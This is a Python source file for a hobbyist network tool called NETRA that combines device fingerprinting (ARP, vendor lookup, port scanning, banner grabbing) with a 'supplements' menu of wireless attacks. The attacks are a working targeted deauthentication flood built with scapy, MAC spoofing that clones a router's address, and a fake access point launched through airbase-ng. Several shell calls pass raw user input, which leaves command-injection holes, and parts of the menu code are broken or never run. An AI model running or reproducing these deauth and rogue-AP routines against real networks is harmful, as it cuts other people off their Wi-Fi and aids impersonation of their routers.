#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#NETRA
from modules.arp_scan import get_mac
from modules.hostname import get_hostname
from modules.vendor_lookup import load_oui_db, get_vendor
from modules.port_scan import scan_ports
from modules.banner import get_banner
from modules.fingerprint import identify_device
from modules.utils import log, C


import argparse
import time
import sys
import webbrowser
import socket 
import ipaddress
import re
import random
import os
import subprocess
from scapy.all import RandMAC, Ether, srp, ARP, Dot11, Dot11Deauth, sendp, RadioTap

GITHUB_URL = "https://github.com/akbas70"

HELPFUL_LINKS = [
"1. ARP packet configuration: https://en.wikipedia.org/wiki/Address_Resolution_Protocol",
"2. OUI (Vendor MAC) database: https://standards-oui.ieee.org/",
"3. Port scanning theory: https://en.wikipedia.org/wiki/Port_scanning"
]

ADDITIONAL_FEATURES = [
    """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀⠀⠀⠀⠰⣶⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⣴⠇⠀⠀⠀⠀⠸⣦⠈⢿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⢸⡏⢰⡇⠀⠀⢸⡆⢸⡆⢸⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠘⣧⡈⠃⢰⡆⠘⢁⣼⠁⣸⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣄⠘⠃⠀⢸⡇⠀⠘⠁⣰⡟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⢸⡇⠀⠀⠘⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⢸⣿⣟⠉⢻⡟⠉⢻⡟⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⢸⣿⣿⣷⣿⣿⣶⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⠈⠉⠉⢉⣉⣉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣉⣉⡉⠉⠉⠁⠀
⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀
Additional Features Menu
==========================================================================================
[1]Deauther blindly                                                                      =
[2]Deauther target                                                                      ==
[3]Scan for neighboring routers                                                         ==
[4]Change MAC                                                                           ==
[5]Fake router (can only create fake router, can not be used as malicious access point) ==
[0]Exit                                                                                 ==
==========================================================================================
"""]

MENU = """

        ⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣀⣀⡀⠀⠀⠀⠀⠈⠛⢿⣦⡀⠀
⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⣏⣭⣻⣛⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
⣿⣿⣦⡀⣠⣾⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠘⠀⠈⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⠀⢀⣀⣶⣦⣶⣦⣄⡀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣷⣄⣀⣴⣿⣿⣭⣭⣭⣿⣽⣿⣷⣀⣀⣾⡿⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⠘⢿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⠿⡋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⠀⠀⣀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠿⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
CODER: nexucy19 
NETRA--version: 1.0.0--

NETRA - WIreless device FINGERPRINT scanner  
=================================================================
                                                                =
        [1]scan Default                                        ==
        [2]scan custom ports                                   ==
        [3]specify OUI file                                    ==
        [4]attempt hostname resolution                         ==
        [5]create soucre (demo)                                ==
        [6]Multi-function advanced self-encoding mode (demo)   ==
        [7]supplements                                         ==
        [8]github                                              ==
        [9]helpful links                                       ==
        [0]exit                                                 =
=================================================================       """
def check_root():

    if os.geteuid() != 0:

        print("This script must be run as root!")

        sys.exit(1)


def check_interface(interface):

    result = subprocess.run(["ip", "link", "show", interface], capture_output=True, text=True)

    if result.returncode != 0:

        print(f"Interface {interface} does not exist!")

        return False

    return True


def check_monitor_mode(interface):

    result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)

    if "Mode:Monitor" not in result.stdout:

        print(f"Interface {interface} is not in Monitor mode!")

        return False

    return True


def get_monitor_interface(interface):

    result = subprocess.run(["iwconfig"], capture_output=True, text=True)

    for line in result.stdout.splitlines():

        if interface in line and "Mode:Monitor" in line:

            return line.split()[0]

    return None


def supplements_menu():

    check_root()

    

    interface = "wlan0"

    monitor_interface = get_monitor_interface(interface)

    

    if not monitor_interface:

        print(f"Please set {interface} to Monitor mode first (using airmon-ng or similar)")

        return

    

    print(f"Using monitor interface: {monitor_interface}")

    

    while True:

        print(ADDITIONAL_FEATURES[0])

        choice = input(f"Enter your choice (0-5): ")

        

        if choice == '1':

            def change_mac(interface, new_mac=None):

                if new_mac is None:

                    new_mac = RandMAC()

                os.system(f"ifconfig {interface} down")

                os.system(f"ifconfig {interface} hw ether {new_mac}")

                os.system(f"ifconfig {interface} up")

            

            def scan_routers(interface):

                arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24")

                ans, unans = srp(arp_request, timeout=3, verbose=0, iface=interface)

                

                for snd, rcv in ans:

                    if rcv.psrc.startswith("192.168.1"):

                        print(f"Found router at {rcv.psrc} with MAC {rcv.hwsrc}")

                        change_mac(interface, rcv.hwsrc)

                        break

        

        elif choice == '2':

            try:

                def deauther_target(interface, target_mac, gateway_mac):

                    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

                    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

                    sendp(packet, iface=interface, count=100, inter=0.1)

                

                target_mac = input("Enter target MAC address: ")

                gateway_mac = input("Enter gateway MAC address: ")

                deauther_target(monitor_interface, target_mac, gateway_mac)

            except Exception as e:

                print(f"Error during deauther target: {e}")

        

        elif choice == '3':

            def scan_network(interface):

                arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24")

                ans, unans = srp(arp_request, timeout=3, verbose=0, iface=interface)

                

                for snd, rcv in ans:

                    print(f"IP: {rcv.psrc} - MAC: {rcv.hwsrc}")

            

            scan_network(monitor_interface)

        

        elif choice == '4':

            def change_mac(interface, new_mac=None):

                if new_mac is None:

                    new_mac = RandMAC()

                os.system(f"ifconfig {interface} down")

                os.system(f"ifconfig {interface} hw ether {new_mac}")

                os.system(f"ifconfig {interface} up")

                print(f"New MAC address: {new_mac}")

            

            new_mac = input("Enter new MAC address (leave blank for random): ")

            change_mac(monitor_interface, new_mac)

        

        elif choice == '5':

            def create_fake_router(interface, ssid, channel):

                os.system(f"airbase-ng --essid {ssid} --channel {channel} {interface}")

            

            ssid = input("Enter SSID for fake router: ")

            channel = input("Enter channel for fake router: ")

            create_fake_router(monitor_interface, ssid, channel)

        

        elif choice == '0':

            print("Exiting supplements menu...")

            break

        

        else:

            print("Invalid choice. Please try again.")


def show_menu():
    while True:
        print(MENU)
        choice = input(f"{C.B}Enter your choice (0-9): {C.END}")
        
        if choice == '1':
            target = input("Enter target IP address for Default Scan: ")
            sys.argv = ['', '-t', target]
            main()
            sys.argv = sys.argv[0:1] 
        
        elif choice == '2':
            target = input("Enter target IP address: ")
            ports = input("Enter custom ports (e.g., 22,80,1000-2000): ")
            sys.argv = ['', '-t', target, '--ports', ports]
            main()
            sys.argv = sys.argv[0:1]
        
        elif choice == '3':
            oui_file = input("Enter path to OUI file (default: oui.txt): ")
            print(f"Set OUI file to: {oui_file}. You must run scan (1 or 2) next.")
            sys.argv = sys.argv[0:1] + ['--oui'] + [oui_file]
        
        elif choice == '4':
            ipadress = socket.gethostbyname(socket.gethostname())
            print(f"Attempting hostname resolution for local IP: {ipadress}")
            hostname = get_hostname(ipadress)
            if hostname:
                print(f"Hosnamme: {C.G}{hostname}{C.END}")
            else:
                print("Hostname not available.")
        
        elif choice == '5':
            print("Creating source code is not implemented in this  DEMO version")
        
        elif choice == '6':
            print("Multi-funcion advanced self-encoding mode is not implemented in this DEMO version")

        elif choice == '7':
            supplements_menu()
        
        elif choice == '8':
            print(f"opening Github page: {GITHUB_URL}")
            webbrowser.open(GITHUB_URL)
        
        elif choice == '9':
            print("Helpful Links:")
            for link in HELPFUL_LINKS:
                print(f"- {link}")
            while True:
                back = input(f"{C.B}Enter to go back to menu or '0' to exit: {C.END}")
                if back == '':
                    break
                elif back == '0':
                    print("Exiting sacnner Goodbye!")
                    sys.exit(0)
                else:
                    print(f"{C.R}Invalid input. please tru again.{C.END}")
        
        
        elif choice == '0':
            print("Exiting scanner. Goodbye!")
            sys.exit(0)


def main():
    parser = argparse.ArgumentParser(description="evice Fingerprint Scanner")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("--ports", help="Port list, e.g. 22,80,443")
    parser.add_argument("--oui", default="oui.txt", help="OUI file for vendor lookup")
    args = parser.parse_args()

    target = args.target
    log(f"Analyzing device: {target}")

    #hostname 
    hostname = get_hostname(target)
    log(f"Hostname: {C.G}{hostname}{C.END}" if hostname else "Hostname not available.")

    #MAC + Vendor
    mac = get_mac(target)
    log(f"MAC Address: {C.Y}{mac}{C.END}" if mac else "MAC address not available (not in LAN?).")

    vendor = None
    if mac:
        oui_db = load_oui_db(args.oui)
        vendor = get_vendor(mac, oui_db)
        log(f"Vendor: {C.G}{vendor}{C.END}" if vendor else "Vendor not found.")

    # port scan
    ports = [80, 443, 22, 23, 554, 8080, 8000, 21, 25, 110, 139, 445]
    if args.ports:
        ports = [int(x.strip()) for x in args.ports.split(",")]

    log("Scanning ports...")
    start = time.time()
    port_results = scan_ports(target, ports)
    elapsed = time.time() - start

    open_ports = [p for p, ok in port_results if ok]
    for port in open_ports:
        banner = get_banner(target, port)
        log(f"Port {port} OPEN → Banner: {banner}")

    #fingerprint device 
    device_type = identify_device(open_ports, banner if open_ports else "")
    log(f"Likely device type: {C.G}{device_type}{C.END}")

    log(f"Completed in {elapsed:.2f} seconds.")




if __name__ == "__main__":
    if check_interface("wlan0"):

        supplements_menu()
    if len(sys.argv) > 1:
        main()

    else:
        show_menu()
